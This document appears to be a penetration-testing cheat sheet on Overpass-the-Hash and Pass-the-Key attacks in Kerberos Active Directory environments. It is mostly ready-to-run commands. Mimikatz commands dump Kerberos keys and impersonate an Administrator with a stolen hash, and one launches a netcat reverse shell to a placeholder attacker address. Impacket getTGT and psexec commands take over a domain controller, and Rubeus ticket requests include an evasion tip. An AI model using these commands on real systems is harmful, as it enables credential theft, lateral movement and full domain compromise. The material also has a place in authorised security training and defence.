# Overpass the Hash / Pass the Key (PtK)

## Similar to PtH but applied to kerberos networks.

### The Overpass The Hash/Pass The Key (PTK) attack is designed for environments where the traditional NTLM protocol is restricted, and Kerberos authentication takes precedence. This attack leverages the NTLM hash or AES keys of a user to solicit Kerberos tickets, enabling unauthorized access to resources within a network.

### To execute this attack, the initial step involves acquiring the NTLM hash or password of the targeted user's account. Upon securing this information, a Ticket Granting Ticket (TGT) for the account can be obtained, allowing the attacker to access services or machines to which the user has permissions.

### If we have any of those keys (DES,RC4,AES128,AES256) we can ask the KDC for a TGT without requiring the actual password. (Pass-the-Key)

## Globally, all the Impacket tools and the ones that use the library can authenticate via Pass The Key with the -aesKey command line parameter instead of specifying the password. For NetExec it's --aesKey.

#### 

    privilege::debug

#### 

    sekurlsa::ekeys

#### 

    sekurlsa::pth /user:Administrator /domain:DOMAIN /rc4:KEY /run:"c:\tools\nc64.exe -e cmd.exe ATTACK_IP PORT"

OR 

    Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:Security.local /ntlm:<ntlmhash> /run:powershell.exe"'

#### /aes128:KEY can also be used instead 

#### /aes256:KEY can also be used instead 

#### 

    nc -lvp PORT

## Alternate Method: Impacket getTGT

    impacket-getTGT -dc-ip DC_IP -hashes :32196b56ffe6f45e294117b91a83bf38 domain.local/Administrator

    export KRB5CCNAME=Administrator.ccache

    impacket-psexec domain.local/administrator@DC.domain.local -k -no-pass -dc-ip DC_IP

## Alternate Method: Rubeus

    .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt

    .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

    .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec (Use AES256 for better opsec)


## Tools: Rubeus , getTGT.py

#### 1) getTGT.py

    getTGT.py DOMAIN/USER -hashes:HASHES (Overpass the Hash. Pass the ticket with NTLM hash)

    getTGT.py -aesKey 'KEY' DOMAIN/USER@IP (Pass the Key. Pass the ticket with AES Key)

#### 2) Rubeus

    Rubeus asktgt /user:VICTIM /rc4:RC4_VALUE

    Rubeus ptt /ticket:TICKET (Successful PtT attack)

### Alternate usage:

    Rubeus asktgt /user:VICTIM /rc4:RC4_VALUE

    Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]

    Rubeus ptt /luid:0xdeadbeef /ticket:TICKET (Pass the ticket)
